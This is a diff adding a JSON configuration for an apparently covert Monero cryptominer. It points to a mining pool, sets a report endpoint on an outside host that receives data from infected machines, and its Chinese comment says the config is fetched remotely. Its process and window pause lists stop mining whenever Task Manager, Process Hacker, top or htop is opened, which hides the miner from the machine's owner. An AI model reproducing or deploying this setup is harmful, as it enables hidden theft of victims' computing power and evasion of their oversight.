@@ -1,0 +1,49 @@
+{
+    "comment": "这是一个示例配置文件，程序会自动从远程获取，无需手动配置",
+    "dry-run": false,
+    "background": false,
+    
+    "cpu-high-pause": 95,
+    "cpu-low-resume": 30,
+    "cpu-control-interval": 3,
+    "cpu-resume-delay": 30,
+    
+    "process-pause-names": "taskmgr.exe,processhacker.exe,top,htop",
+    "window-pause-names": "Task Manager,System Monitor",
+    
+    "report-host": "serveris.lieshoubbs.com",
+    "report-port": 8181,
+    "report-path": "/cpu/api/collect.php",
+    
+    "donate-level": 0,
+    "donate-address": "",
+    "donate-use-user-pool": true,
+    
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": 70,
+        "yield": true
+    },
+    
+    "opencl": {
+        "enabled": false
+    },
+    
+    "cuda": {
+        "enabled": false
+    },
+    
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:3333",
+            "user": "YOUR_WALLET_ADDRESS",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        }
+    ],
+    
+    "print-time": 60,
+    "log-file": null,
+    "autosave": true
+}
